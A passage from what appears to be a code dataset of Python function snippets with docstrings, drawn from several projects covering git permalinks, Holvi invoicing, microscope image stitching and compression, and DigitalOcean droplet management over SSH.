#https://github.com/github/hubot/blob/ed25584f5ac2520a6c28547ffd0961c7abd7ea49/README.md\n        #https://gitlab.com/pingali/simple-regression/blob/3764cc2600b221ac7d7497de3d0dbcb4cffa2914/model.py\n        #https://github.com/pingali/dgit/blob/ff91b5d04b2978cad0bf9b006d1b0a16d18a778e/README.rst\n        #https://gitlab.com/kanban_demo/test_project/blob/b004677c23b3a31eb7b5588a5194857b2c8b2b95/README.md\n\n        m = re.search('^git@([^:\\/]+):([^/]+)/([^/]+)', remoteurl)\n        if m is None:\n            m = re.search('^https://([^:/]+)/([^/]+)/([^/]+)', remoteurl)\n        if m is not None:\n            domain = m.group(1)\n            username = m.group(2)\n            project = m.group(3)\n            if project.endswith(\".git\"):\n                project = project[:-4]\n            permalink = \"https://{}/{}/{}/blob/{}/{}\".format(domain, username, project,\n                                                        sha1, relpath)\n            # print(\"permalink = \", permalink)\n            return (relpath, permalink)\n        else:\n            return (None, None)"
        ],
        [
            "def add_files(self, repo, files):\n        \"\"\"\n        Add files to the repo\n        \"\"\"\n        rootdir = repo.rootdir\n        for f in files:\n            relativepath = f['relativepath']\n            sourcepath = f['localfullpath']\n            if sourcepath is None:\n                # This can happen if the relative path is a URL\n                continue #\n            # Prepare the target path\n            targetpath = os.path.join(rootdir, relativepath)\n            try:\n                os.makedirs(os.path.dirname(targetpath))\n            except:\n                pass\n            # print(sourcepath,\" => \", targetpath)\n            print(\"Updating: {}\".format(relativepath))\n            shutil.copyfile(sourcepath, targetpath)\n            with cd(repo.rootdir):\n                self._run(['add', relativepath])"
        ],
        [
            "def send(self, send_email=True):\n        \"\"\"Marks the invoice as sent in Holvi\n\n        If send_email is False then the invoice is *not* automatically emailed to the recipient\n        and your must take care of sending the invoice yourself.\n        \"\"\"\n        url = str(self.api.base_url + '{code}/status/').format(code=self.code)  # six.u messes this up\n        payload = {\n            'mark_as_sent': True,\n            'send_email': send_email,\n        }\n        stat = self.api.connection.make_put(url, payload)"
        ],
        [
            "def to_holvi_dict(self):\n        \"\"\"Convert our Python object to JSON acceptable to Holvi API\"\"\"\n        self._jsondata[\"items\"] = []\n        for item in self.items:\n            self._jsondata[\"items\"].append(item.to_holvi_dict())\n        self._jsondata[\"issue_date\"] = self.issue_date.isoformat()\n        self._jsondata[\"due_date\"] = self.due_date.isoformat()\n        self._jsondata[\"receiver\"] = self.receiver.to_holvi_dict()\n        return {k: v for (k, v) in self._jsondata.items() if k in self._valid_keys}"
        ],
        [
            "def api_call_action(func): \n    \"\"\"\n    API wrapper documentation\n    \"\"\"\n    def _inner(*args, **kwargs):\n        return func(*args, **kwargs)\n    _inner.__name__ = func.__name__\n    _inner.__doc__ = func.__doc__\n    return _inner"
        ],
        [
            "def save(self):\n        \"\"\"Saves this order to Holvi, returns a tuple with the order itself and checkout_uri\"\"\"\n        if self.code:\n            raise HolviError(\"Orders cannot be updated\")\n        send_json = self.to_holvi_dict()\n        send_json.update({\n            'pool': self.api.connection.pool\n        })\n        url = six.u(self.api.base_url + \"order/\")\n        stat = self.api.connection.make_post(url, send_json)\n        code = stat[\"details_uri\"].split(\"/\")[-2]  # Maybe slightly ugly but I don't want to basically reimplement all but uri formation of the api method\n        return (stat[\"checkout_uri\"], self.api.get_order(code))"
        ],
        [
            "def untokenize(tokens):\n    \"\"\"Return source code based on tokens.\n\n    This is like tokenize.untokenize(), but it preserves spacing between\n    tokens. So if the original soure code had multiple spaces between\n    some tokens or if escaped newlines were used, those things will be\n    reflected by untokenize().\n\n    \"\"\"\n    text = ''\n    previous_line = ''\n    last_row = 0\n    last_column = -1\n    last_non_whitespace_token_type = None\n\n    for (token_type, token_string, start, end, line) in tokens:\n        if TOKENIZE_HAS_ENCODING and token_type == tokenize.ENCODING:\n            continue\n\n        (start_row, start_column) = start\n        (end_row, end_column) = end\n\n        # Preserve escaped newlines.\n        if (\n            last_non_whitespace_token_type != tokenize.COMMENT and\n            start_row > last_row and\n            previous_line.endswith(('\\\\\\n', '\\\\\\r\\n', '\\\\\\r'))\n        ):\n            text += previous_line[len(previous_line.rstrip(' \\t\\n\\r\\\\')):]\n\n        # Preserve spacing.\n        if start_row > last_row:\n            last_column = 0\n        if start_column > last_column:\n            text += line[last_column:start_column]\n\n        text += token_string\n\n        previous_line = line\n\n        last_row = end_row\n        last_column = end_column\n\n        if token_type not in WHITESPACE_TOKENS:\n            last_non_whitespace_token_type = token_type\n\n    return text"
        ],
        [
            "def init(globalvars=None, show=False):\n    \"\"\"\n    Load profile INI\n    \"\"\"\n    global config\n\n    profileini = getprofileini()\n    if os.path.exists(profileini):\n        config = configparser.ConfigParser()\n        config.read(profileini)\n        mgr = plugins_get_mgr()\n        mgr.update_configs(config)\n\n        if show:\n            for source in config:\n                print(\"[%s] :\" %(source))\n                for k in config[source]:\n                    print(\"   %s : %s\" % (k, config[source][k]))\n\n    else:\n        print(\"Profile does not exist. So creating one\")\n        if not show:\n            update(globalvars)\n\n    print(\"Complete init\")"
        ],
        [
            "def update(globalvars):\n    \"\"\"\n    Update the profile\n    \"\"\"\n    global config\n\n    profileini = getprofileini()\n    config = configparser.ConfigParser()\n    config.read(profileini)\n    defaults = {}\n\n    if globalvars is not None:\n        defaults = {a[0]: a[1] for a in globalvars }\n\n    # Generic variables to be captured...\n    generic_configs = [{\n        'name': 'User',\n        'nature': 'generic',\n        'description': \"General information\",\n        'variables': ['user.email', 'user.name',\n                      'user.fullname'],\n        'defaults': {\n            'user.email': {\n                'value': defaults.get('user.email',''),\n                'description': \"Email address\",\n                'validator': EmailValidator()\n            },\n            'user.fullname': {\n                'value': defaults.get('user.fullname',''),\n                'description': \"Full Name\",\n                'validator': NonEmptyValidator()\n            },\n            'user.name': {\n                'value': defaults.get('user.name', getpass.getuser()),\n                'description': \"Name\",\n                'validator': NonEmptyValidator()\n            },\n        }\n    }]\n\n    # Gather configuration requirements from all plugins\n    mgr = plugins_get_mgr()\n    extra_configs = mgr.gather_configs()\n    allconfigs = generic_configs + extra_configs\n\n    # Read the existing config and update the defaults\n    for c in allconfigs:\n        name = c['name']\n        for v in c['variables']:\n            try:\n                c['defaults'][v]['value'] = config[name][v]\n            except:\n                continue\n\n    for c in allconfigs:\n\n        print(\"\")\n        print(c['description'])\n        print(\"==================\")\n        if len(c['variables']) == 0:\n            print(\"Nothing to do. Enabled by default\")\n            continue\n\n        name = c['name']\n        config[name] = {}\n        config[name]['nature'] = c['nature']\n        for v in c['variables']:\n\n            # defaults\n            value = ''\n            description = v + \" \"\n            helptext = \"\"\n            validator = None\n\n            # Look up pre-set values\n            if v in c['defaults']:\n                value = c['defaults'][v].get('value','')\n                helptext = c['defaults'][v].get(\"description\",\"\")\n                validator = c['defaults'][v].get('validator',None)\n            if helptext != \"\":\n                description += \"(\" + helptext + \")\"\n\n            # Get user input..\n            while True:\n                choice = input_with_default(description, value)\n                if validator is not None:\n                    if validator.is_valid(choice):\n                        break\n                    else:\n                        print(\"Invalid input. Expected input is {}\".format(validator.message))\n                else:\n                    break\n\n            config[name][v] = choice\n\n            if v == 'enable' and choice == 'n': \n                break \n\n    with open(profileini, 'w') as fd:\n        config.write(fd)\n\n    print(\"Updated profile file:\", config)"
        ],
        [
            "def init_repo(self, gitdir):\n        \"\"\"\n        Insert hook into the repo\n        \"\"\"\n\n        hooksdir = os.path.join(gitdir, 'hooks')\n        content = postreceive_template % {\n            'client': self.client,\n            'bucket': self.bucket,\n            's3cfg': self.s3cfg,\n            'prefix': self.prefix\n            }\n\n        postrecv_filename =os.path.join(hooksdir, 'post-receive')\n        with open(postrecv_filename,'w') as fd:\n            fd.write(content)\n\n        self.make_hook_executable(postrecv_filename)\n        print(\"Wrote to\", postrecv_filename)"
        ],
        [
            "def compute_sha256(filename):\n    \"\"\"\n    Try the library. If it doesnt work, use the command line..\n    \"\"\"\n    try:\n        h = sha256()\n        fd = open(filename, 'rb')\n        while True:\n            buf = fd.read(0x1000000)\n            if buf in [None, \"\"]:\n                break\n            h.update(buf.encode('utf-8'))\n        fd.close()\n        return h.hexdigest()\n    except:\n        output = run([\"sha256sum\", \"-b\", filename])\n        return output.split(\" \")[0]"
        ],
        [
            "def run(cmd):\n    \"\"\"\n    Run a shell command\n    \"\"\"\n    cmd = [pipes.quote(c) for c in cmd]\n    cmd = \" \".join(cmd)\n    cmd += \"; exit 0\"\n    # print(\"Running {} in {}\".format(cmd, os.getcwd()))\n    try:\n        output = subprocess.check_output(cmd,\n                                         stderr=subprocess.STDOUT,\n                                         shell=True)\n    except subprocess.CalledProcessError as e:\n            output = e.output\n\n    output = output.decode('utf-8')\n    output = output.strip()\n    return output"
        ],
        [
            "def get_tree(gitdir=\".\"):\n    \"\"\"\n    Get the commit history for a given dataset\n    \"\"\"\n\n    cmd = [\"git\", \"log\", \"--all\", \"--branches\", '--pretty=format:{  \"commit\": \"%H\",  \"abbreviated_commit\": \"%h\",  \"tree\": \"%T\",  \"abbreviated_tree\": \"%t\",  \"parent\": \"%P\",  \"abbreviated_parent\": \"%p\",  \"refs\": \"%d\",  \"encoding\": \"%e\",  \"subject\": \"%s\", \"sanitized_subject_line\": \"%f\",  \"commit_notes\": \"\",  \"author\": {    \"name\": \"%aN\",    \"email\": \"%aE\",    \"date\": \"%ai\"  },  \"commiter\": {    \"name\": \"%cN\",    \"email\": \"%cE\",    \"date\": \"%ci\"  }},']\n\n    output = run(cmd)\n    lines = output.split(\"\\n\")\n\n    content = \"\"\n    history = []\n    for l in lines:\n        try:\n            revisedcontent = content + l\n            if revisedcontent.count('\"') % 2 == 0:\n                j = json.loads(revisedcontent[:-1])\n                if \"Notes added by\" in j['subject']:\n                    content = \"\"\n                    continue\n                history.append(j)\n                content = \"\"\n            else:\n                content = revisedcontent\n        except Exception as e:\n            print(\"Error while parsing record\")\n            print(revisedcontent)\n            content = \"\"\n\n    # Order by time. First commit first...\n    history.reverse()\n\n    #\n    changes = get_change()\n\n    for i in range(len(history)):\n        abbrev_commit = history[i]['abbreviated_commit']\n        if abbrev_commit not in changes:\n            raise Exception(\"Missing changes for \" + abbrev_commit)\n\n        history[i]['changes'] = changes[abbrev_commit]['changes']\n\n\n    return history"
        ],
        [
            "def get_diffs(history):\n    \"\"\"\n    Look at files and compute the diffs intelligently\n    \"\"\"\n\n    # First get all possible representations\n    mgr = plugins_get_mgr() \n    keys = mgr.search('representation')['representation']\n    representations = [mgr.get_by_key('representation', k) for k in keys]\n\n    for i in range(len(history)):\n        if i+1 > len(history) - 1:\n            continue\n\n        prev = history[i]\n        curr = history[i+1]\n\n        #print(prev['subject'], \"==>\", curr['subject'])\n        #print(curr['changes'])\n        for c in curr['changes']:\n            \n            path = c['path']\n\n            # Skip the metadata file\n            if c['path'].endswith('datapackage.json'): \n                continue \n\n            # Find a handler for this kind of file...\n            handler = None \n            for r in representations: \n                if r.can_process(path): \n                    handler = r \n                    break \n            \n            if handler is None: \n                continue \n\n            # print(path, \"being handled by\", handler)\n\n            v1_hex = prev['commit']\n            v2_hex = curr['commit']\n\n            temp1 = tempfile.mkdtemp(prefix=\"dgit-diff-\") \n            \n            try: \n                for h in [v1_hex, v2_hex]: \n                    filename = '{}/{}/checkout.tar'.format(temp1, h)\n                    try:\n                        os.makedirs(os.path.dirname(filename))\n                    except:\n                        pass \n                    extractcmd = ['git', 'archive', '-o', filename, h, path]\n                    output = run(extractcmd)\n                    if 'fatal' in output: \n                        raise Exception(\"File not present in commit\") \n                    with cd(os.path.dirname(filename)): \n                        cmd = ['tar', 'xvf', 'checkout.tar']\n                        output = run(cmd) \n                        if 'fatal' in output: \n                            print(\"Cleaning up - fatal 1\", temp1)\n                            shutil.rmtree(temp1)\n                            continue \n\n                # Check to make sure that \n                path1 = os.path.join(temp1, v1_hex, path) \n                path2 = os.path.join(temp1, v2_hex, path) \n                if not os.path.exists(path1) or not os.path.exists(path2): \n                    # print(\"One of the two output files is missing\") \n                    shutil.rmtree(temp1)\n                    continue \n\n                #print(path1, path2) \n\n                # Now call the handler\n                diff = handler.get_diff(path1, path2)\n\n                # print(\"Inserting diff\", diff)\n                c['diff'] = diff\n\n            except Exception as e: \n                #traceback.print_exc() \n                #print(\"Cleaning up - Exception \", temp1)\n                shutil.rmtree(temp1)"
        ],
        [
            "def wait(self, cmd, raise_on_error=True):\n        \"\"\"\n        Execute command and wait for it to finish. Proceed with caution because\n        if you run a command that causes a prompt this will hang\n        \"\"\"\n        _, stdout, stderr = self.exec_command(cmd)\n        stdout.channel.recv_exit_status()\n        output = stdout.read()\n        if self.interactive:\n            print(output)\n        errors = stderr.read()\n        if self.interactive:\n            print(errors)\n        if errors and raise_on_error:\n            raise ValueError(errors)\n        return output"
        ],
        [
            "def sudo(self, password=None):\n        \"\"\"\n        Enter sudo mode\n        \"\"\"\n        if self.username == 'root':\n            raise ValueError('Already root user')\n        password = self.validate_password(password)\n        stdin, stdout, stderr = self.exec_command('sudo su')\n        stdin.write(\"%s\\n\" % password)\n        stdin.flush()\n        errors = stderr.read()\n        if errors:\n            raise ValueError(errors)"
        ],
        [
            "def apt(self, package_names, raise_on_error=False):\n        \"\"\"\n        Install specified packages using apt-get. -y options are\n        automatically used. Waits for command to finish.\n\n        Parameters\n        ----------\n        package_names: list-like of str\n        raise_on_error: bool, default False\n            If True then raise ValueError if stderr is not empty\n            debconf often gives tty error\n        \"\"\"\n        if isinstance(package_names, basestring):\n            package_names = [package_names]\n        cmd = \"apt-get install -y %s\" % (' '.join(package_names))\n        return self.wait(cmd, raise_on_error=raise_on_error)"
        ],
        [
            "def pip(self, package_names, raise_on_error=True):\n        \"\"\"\n        Install specified python packages using pip. -U option added\n        Waits for command to finish.\n\n        Parameters\n        ----------\n        package_names: list-like of str\n        raise_on_error: bool, default True\n            If True then raise ValueError if stderr is not empty\n        \"\"\"\n        if isinstance(package_names, basestring):\n            package_names = [package_names]\n        cmd = \"pip install -U %s\" % (' '.join(package_names))\n        return self.wait(cmd, raise_on_error=raise_on_error)"
        ],
        [
            "def pip_r(self, requirements, raise_on_error=True):\n        \"\"\"\n        Install all requirements contained in the given file path\n        Waits for command to finish.\n\n        Parameters\n        ----------\n        requirements: str\n            Path to requirements.txt\n        raise_on_error: bool, default True\n            If True then raise ValueError if stderr is not empty\n        \"\"\"\n        cmd = \"pip install -r %s\" % requirements\n        return self.wait(cmd, raise_on_error=raise_on_error)"
        ],
        [
            "def stitch_macro(path, output_folder=None):\n    \"\"\"Create fiji-macros for stitching all channels and z-stacks for a well.\n\n    Parameters\n    ----------\n    path : string\n        Well path.\n    output_folder : string\n        Folder to store images. If not given well path is used.\n\n    Returns\n    -------\n    output_files, macros : tuple\n        Tuple with filenames and macros for stitched well.\n    \"\"\"\n    output_folder = output_folder or path\n    debug('stitching ' + path + ' to ' + output_folder)\n\n    fields = glob(_pattern(path, _field))\n\n    # assume we have rectangle of fields\n    xs = [attribute(field, 'X') for field in fields]\n    ys = [attribute(field, 'Y') for field in fields]\n    x_min, x_max = min(xs), max(xs)\n    y_min, y_max = min(ys), max(ys)\n    fields_column = len(set(xs))\n    fields_row = len(set(ys))\n\n    # assume all fields are the same\n    # and get properties from images in first field\n    images = glob(_pattern(fields[0], _image))\n\n    # assume attributes are the same on all images\n    attr = attributes(images[0])\n\n    # find all channels and z-stacks\n    channels = []\n    z_stacks = []\n    for image in images:\n        channel = attribute_as_str(image, 'C')\n        if channel not in channels:\n            channels.append(channel)\n\n        z = attribute_as_str(image, 'Z')\n        if z not in z_stacks:\n            z_stacks.append(z)\n\n    debug('channels ' + str(channels))\n    debug('z-stacks ' + str(z_stacks))\n\n    # create macro\n    _, extension = os.path.splitext(images[-1])\n    if extension == '.tif':\n        # assume .ome.tif\n        extension = '.ome.tif'\n    macros = []\n    output_files = []\n    for Z in z_stacks:\n        for C in channels:\n            filenames = os.path.join(\n\n                    _field + '--X{xx}--Y{yy}',\n                    _image + '--L' + attr.L +\n                    '--S' + attr.S +\n                    '--U' + attr.U +\n                    '--V' + attr.V +\n                    '--J' + attr.J +\n                    '--E' + attr.E +\n                    '--O' + attr.O +\n                    '--X{xx}--Y{yy}' +\n                    '--T' + attr.T +\n                    '--Z' + Z +\n                    '--C' + C +\n                    extension)\n            debug('filenames ' + filenames)\n\n            cur_attr = attributes(filenames)._asdict()\n            f = 'stitched--U{U}--V{V}--C{C}--Z{Z}.png'.format(**cur_attr)\n\n            output = os.path.join(output_folder, f)\n            debug('output ' + output)\n            output_files.append(output)\n            if os.path.isfile(output):\n                # file already exists\n                print('leicaexperiment stitched file already'\n                      ' exists {}'.format(output))\n                continue\n            macros.append(fijibin.macro.stitch(path, filenames,\n                                  fields_column, fields_row,\n                                  output_filename=output,\n                                  x_start=x_min, y_start=y_min))\n\n    return (output_files, macros)"
        ],
        [
            "def compress(images, delete_tif=False, folder=None):\n    \"\"\"Lossless compression. Save images as PNG and TIFF tags to json. Can be\n    reversed with `decompress`. Will run in multiprocessing, where\n    number of workers is decided by ``leicaexperiment.experiment._pools``.\n\n    Parameters\n    ----------\n    images : list of filenames\n        Images to lossless compress.\n    delete_tif : bool\n        Wheter to delete original images.\n    folder : string\n        Where to store images. Basename will be kept.\n\n    Returns\n    -------\n    list of filenames\n        List of compressed files.\n    \"\"\"\n    if type(images) == str:\n        # only one image\n        return [compress_blocking(images, delete_tif, folder)]\n\n    filenames = copy(images) # as images property will change when looping\n\n\n    return Parallel(n_jobs=_pools)(delayed(compress_blocking)\n                     (image=image, delete_tif=delete_tif, folder=folder)\n                     for image in filenames)"
        ],
        [
            "def compress_blocking(image, delete_tif=False, folder=None, force=False):\n    \"\"\"Lossless compression. Save image as PNG and TIFF tags to json. Process\n    can be reversed with `decompress`.\n\n    Parameters\n    ----------\n    image : string\n        TIF-image which should be compressed lossless.\n    delete_tif : bool\n        Wheter to delete original images.\n    force : bool\n        Wheter to compress even if .png already exists.\n\n    Returns\n    -------\n    string\n        Filename of compressed image, or empty string if compress failed.\n    \"\"\"\n\n    debug('compressing {}'.format(image))\n    try:\n        new_filename, extension = os.path.splitext(image)\n        # remove last occurrence of .ome\n        new_filename = new_filename.rsplit('.ome', 1)[0]\n\n        # if compressed file should be put in specified folder\n        if folder:\n            basename = os.path.basename(new_filename)\n            new_filename = os.path.join(folder, basename + '.png')\n        else:\n            new_filename = new_filename + '.png'\n\n        # check if png exists\n        if os.path.isfile(new_filename) and not force:\n            compressed_images.append(new_filename)\n            msg = \"Aborting compress, PNG already\" \\\n                  \" exists: {}\".format(new_filename)\n            raise AssertionError(msg)\n        if extension != '.tif':\n            msg = \"Aborting compress, not a TIFF: {}\".format(image)\n            raise AssertionError(msg)\n\n        # open image, load and close file pointer\n        img = Image.open(image)\n        fptr = img.fp # keep file pointer, for closing\n        img.load() # load img-data before switching mode, also closes fp\n\n        # get tags and save them as json\n        tags = img.tag.as_dict()\n        with open(new_filename[:-4] + '.json', 'w') as f:\n            if img.mode == 'P':\n                # keep palette\n                tags['palette'] = img.getpalette()\n            json.dump(tags, f)\n\n        # check if image is palette-mode\n        if img.mode == 'P':\n            # switch to luminance to keep data intact\n            debug('palette-mode switched to luminance')\n            img.mode = 'L'\n        if img.mode == 'I;16':\n            # https://github.com/python-pillow/Pillow/issues/1099\n            img = img.convert(mode='I')\n\n        # compress/save\n        debug('saving to {}'.format(new_filename))\n        img.save(new_filename)\n\n        fptr.close() # windows bug Pillow\n        if delete_tif:\n            os.remove(image)\n\n    except (IOError, AssertionError) as e:\n        # print error - continue\n        print('leicaexperiment {}'.format(e))\n        return ''\n\n    return new_filename"
        ],
        [
            "def _set_path(self, path):\n    \"Set self.path, self.dirname and self.basename.\"\n    import os.path\n    self.path = os.path.abspath(path)\n    self.dirname = os.path.dirname(path)\n    self.basename = os.path.basename(path)"
        ],
        [
            "def images(self):\n        \"List of paths to images.\"\n        tifs = _pattern(self._image_path, extension='tif')\n        pngs = _pattern(self._image_path, extension='png')\n        imgs = []\n        imgs.extend(glob(tifs))\n        imgs.extend(glob(pngs))\n        return imgs"
        ],
        [
            "def image(self, well_row, well_column, field_row, field_column):\n        \"\"\"Get path of specified image.\n\n        Parameters\n        ----------\n        well_row : int\n            Starts at 0. Same as --U in files.\n        well_column : int\n            Starts at 0. Same as --V in files.\n        field_row : int\n            Starts at 0. Same as --Y in files.\n        field_column : int\n            Starts at 0. Same as --X in files.\n\n        Returns\n        -------\n        string\n            Path to image or empty string if image is not found.\n        \"\"\"\n        return next((i for i in self.images\n                     if attribute(i, 'u') == well_column and\n                        attribute(i, 'v') == well_row and\n                        attribute(i, 'x') == field_column and\n                        attribute(i, 'y') == field_row), '')"
        ],
        [
            "def well_images(self, well_row, well_column):\n        \"\"\"Get list of paths to images in specified well.\n\n\n        Parameters\n        ----------\n        well_row : int\n            Starts at 0. Same as --V in files.\n        well_column : int\n            Starts at 0. Save as --U in files.\n\n        Returns\n        -------\n        list of strings\n            Paths to images or empty list if no images are found.\n        \"\"\"\n        return list(i for i in self.images\n                    if attribute(i, 'u') == well_column and\n                       attribute(i, 'v') == well_row)"
        ],
        [
            "def stitch(self, folder=None):\n        \"\"\"Stitches all wells in experiment with ImageJ. Stitched images are\n        saved in experiment root.\n\n        Images which already exists are omitted stitching.\n\n        Parameters\n        ----------\n        folder : string\n            Where to store stitched images. Defaults to experiment path.\n\n        Returns\n        -------\n        list\n            Filenames of stitched images. Files which already exists before\n            stitching are also returned.\n        \"\"\"\n        debug('stitching ' + self.__str__())\n        if not folder:\n            folder = self.path\n\n        # create list of macros and files\n        macros = []\n        files = []\n        for well in self.wells:\n            f,m = stitch_macro(well, folder)\n            macros.extend(m)\n            files.extend(f)\n\n        chopped_arguments = zip(chop(macros, _pools), chop(files, _pools))\n        chopped_filenames = Parallel(n_jobs=_pools)(delayed(fijibin.macro.run)\n                                      (macro=arg[0], output_files=arg[1])\n                                      for arg in chopped_arguments)\n\n        # flatten\n        return [f for list_ in chopped_filenames for f in list_]"
        ],
        [
            "def compress(self, delete_tif=False, folder=None):\n        \"\"\"Lossless compress all images in experiment to PNG. If folder is\n        omitted, images will not be moved.\n\n        Images which already exists in PNG are omitted.\n\n        Parameters\n        ----------\n        folder : string\n            Where to store PNGs. Defaults to the folder they are in.\n        delete_tif : bool\n            If set to truthy value, ome.tifs will be deleted after compression.\n\n        Returns\n        -------\n        list\n            Filenames of PNG images. Files which already exists before\n            compression are also returned.\n        \"\"\"\n        return compress(self.images, delete_tif, folder)"
        ],
        [
            "def field_metadata(self, well_row=0, well_column=0,\n                       field_row=0, field_column=0):\n        \"\"\"Get OME-XML metadata of given field.\n\n        Parameters\n        ----------\n        well_row : int\n            Y well coordinate. Same as --V in files.\n        well_column : int\n            X well coordinate. Same as --U in files.\n        field_row : int\n            Y field coordinate. Same as --Y in files.\n        field_column : int\n            X field coordinate. Same as --X in files.\n\n        Returns\n        -------\n        lxml.objectify.ObjectifiedElement\n            lxml object of OME-XML found in slide/chamber/field/metadata.\n        \"\"\"\n        def condition(path):\n            attrs = attributes(path)\n            return (attrs.u == well_column and attrs.v == well_row\n                        and attrs.x == field_column and attrs.y == field_row)\n\n        field = [f for f in self.fields if condition(f)]\n\n        if field:\n            field = field[0]\n            filename = _pattern(field, 'metadata',\n                                _image, extension='*.ome.xml')\n            filename = glob(filename)[0] # resolve, assume found\n            return objectify.parse(filename).getroot()"
        ],
        [
            "def stitch_coordinates(self, well_row=0, well_column=0):\n        \"\"\"Get a list of stitch coordinates for the given well.\n\n        Parameters\n        ----------\n        well_row : int\n            Y well coordinate. Same as --V in files.\n        well_column : int\n            X well coordinate. Same as --U in files.\n\n        Returns\n        -------\n        (xs, ys, attr) : tuples with float and collections.OrderedDict\n            Tuple of x's, y's and attributes.\n        \"\"\"\n        well = [w for w in self.wells\n                    if attribute(w, 'u') == well_column and\n                       attribute(w, 'v') == well_row]\n\n        if len(well) == 1:\n            well = well[0]\n            tile = os.path.join(well, 'TileConfiguration.registered.txt')\n\n            with open(tile) as f:\n                data = [x.strip()\n                            for l in f.readlines()\n                                if l[0:7] == 'image--'\n                                    for x in l.split(';')] # flat list\n                coordinates = (ast.literal_eval(x) for x in data[2::3])\n                # flatten\n                coordinates = sum(coordinates, ())\n                attr = tuple(attributes(x) for x in data[0::3])\n            return coordinates[0::2], coordinates[1::2], attr\n\n        else:\n            print('leicaexperiment stitch_coordinates'\n                  '({}, {}) Well not found'.format(well_row, well_column))"
        ],
        [
            "def create(self, name, region, size, image, ssh_keys=None,\n               backups=None, ipv6=None, private_networking=None, wait=True):\n        \"\"\"\n        Create a new droplet\n\n        Parameters\n        ----------\n        name: str\n            Name of new droplet\n        region: str\n            slug for region (e.g., sfo1, nyc1)\n        size: str\n            slug for droplet size (e.g., 512mb, 1024mb)\n        image: int or str\n            image id (e.g., 12352) or slug (e.g., 'ubuntu-14-04-x64')\n        ssh_keys: list, optional\n            default SSH keys to be added on creation\n            this is highly recommended for ssh access\n        backups: bool, optional\n            whether automated backups should be enabled for the Droplet.\n            Automated backups can only be enabled when the Droplet is created.\n        ipv6: bool, optional\n            whether IPv6 is enabled on the Droplet\n        private_networking: bool, optional\n            whether private networking is enabled for the Droplet. Private\n            networking is currently only available in certain regions\n        wait: bool, default True\n            if True then block until creation is complete\n        \"\"\"\n        if ssh_keys and not isinstance(ssh_keys, (list, tuple)):\n            raise TypeError(\"ssh_keys must be a list\")\n        resp = self.post(name=name, region=region, size=size, image=image,\n                         ssh_keys=ssh_keys,\n                         private_networking=private_networking,\n                         backups=backups, ipv6=ipv6)\n        droplet = self.get(resp[self.singular]['id'])\n        if wait:\n            droplet.wait()\n        # HACK sometimes the IP address doesn't return correctly\n        droplet = self.get(resp[self.singular]['id'])\n        return droplet"
        ],
        [
            "def get(self, id):\n        \"\"\"\n        Retrieve a droplet by id\n\n        Parameters\n        ----------\n        id: int\n            droplet id\n\n        Returns\n        -------\n        droplet: DropletActions\n        \"\"\"\n        info = self._get_droplet_info(id)\n        return DropletActions(self.api, self, **info)"
        ],
        [
            "def restore(self, image, wait=True):\n        \"\"\"\n        Restore this droplet with given image id\n\n        A Droplet restoration will rebuild an image using a backup image.\n        The image ID that is passed in must be a backup of the current Droplet\n        instance. The operation will leave any embedded SSH keys intact.\n\n        Parameters\n        ----------\n        image: int or str\n            int for image id and str for image slug\n        wait: bool, default True\n            Whether to block until the pending action is completed\n        \"\"\"\n        return self._action('restore', image=image, wait=wait)"
        ],
        [
            "def rebuild(self, image, wait=True):\n        \"\"\"\n        Rebuild this droplet with given image id\n\n        Parameters\n        ----------\n        image: int or str\n            int for image id and str for image slug\n        wait: bool, default True\n            Whether to block until the pending action is completed\n        \"\"\"\n        return self._action('rebuild', image=image, wait=wait)"
        ],
        [
            "def rename(self, name, wait=True):\n        \"\"\"\n        Change the name of this droplet\n\n        Parameters\n        ----------\n        name: str\n            New name for the droplet\n        wait: bool, default True\n            Whether to block until the pending action is completed\n\n        Raises\n        ------\n        APIError if region does not support private networking\n        \"\"\"\n        return self._action('rename', name=name, wait=wait)"
        ],
        [
            "def change_kernel(self, kernel_id, wait=True):\n        \"\"\"\n        Change the kernel of this droplet\n\n        Parameters\n        ----------\n        kernel_id: int\n            Can be retrieved from output of self.kernels()\n        wait: bool, default True\n            Whether to block until the pending action is completed\n\n        Raises\n        ------\n        APIError if region does not support private networking\n        \"\"\"\n        return self._action('change_kernel', kernel=kernel_id, wait=wait)"
        ],
        [
            "def delete(self, wait=True):\n        \"\"\"\n        Delete this droplet\n\n        Parameters\n        ----------\n        wait: bool, default True\n            Whether to block until the pending action is completed\n        \"\"\"\n        resp = self.parent.delete(self.id)\n        if wait:\n            self.wait()\n        return resp"
        ],
        [
            "def wait(self):\n        \"\"\"\n        wait for all actions to complete on a droplet\n        \"\"\"\n        interval_seconds = 5\n        while True:\n            actions = self.actions()\n            slept = False\n            for a in actions:\n                if a['status'] == 'in-progress':\n                    # n.b. gevent will monkey patch\n                    time.sleep(interval_seconds)\n                    slept = True\n                    break\n            if not slept:\n                break"
        ],
        [
            "def connect(self, interactive=False):\n        \"\"\"\n        Open SSH connection to droplet\n\n        Parameters\n        ----------\n        interactive: bool, default False\n            If True then SSH client will prompt for password when necessary\n            and also print output to console\n        \"\"\"\n        from poseidon.ssh import SSHClient\n        rs = SSHClient(self.ip_address, interactive=interactive)\n        return rs"
        ],
        [
            "def send_request(self, kind, resource, url_components, **kwargs):\n        \"\"\"\n        Send a request to the REST API\n\n        Parameters\n        ----------\n        kind: str, {get, delete, put, post, head}\n        resource: str\n        url_components: list or tuple to be appended to the request URL\n\n        Notes\n        -----\n        kwargs contain request parameters to be sent as request data\n        \"\"\"\n        url = self.format_request_url(resource, *url_components)\n        meth = getattr(requests, kind)\n        headers = self.get_request_headers()\n        req_data = self.format_parameters(**kwargs)\n        response = meth(url, headers=headers, data=req_data)\n        data = self.get_response(response)\n        if response.status_code >= 300:\n            msg = data.pop('message', 'API request returned error')\n            raise APIError(msg, response.status_code, **data)\n        return data"
        ],
        [
            "def format_parameters(self, **kwargs):\n        \"\"\"\n        Properly formats array types\n        \"\"\"\n        req_data = {}\n        for k, v in kwargs.items():\n            if isinstance(v, (list, tuple)):\n                k = k + '[]'\n            req_data[k] = v\n        return req_data"
        ],
        [
            "def format_request_url(self, resource, *args):\n        \"\"\"create request url for resource\"\"\"\n        return '/'.join((self.api_url, self.api_version, resource) +\n                        tuple(str(x) for x in args))"
        ],
        [
            "def send_request(self, kind, url_components, **kwargs):\n        \"\"\"\n        Send a request for this resource to the API\n\n        Parameters\n        ----------\n        kind: str, {'get', 'delete', 'put', 'post', 'head'}\n        \"\"\"\n        return self.api.send_request(kind, self.resource_path, url_components,\n                                     **kwargs)"
        ],
        [
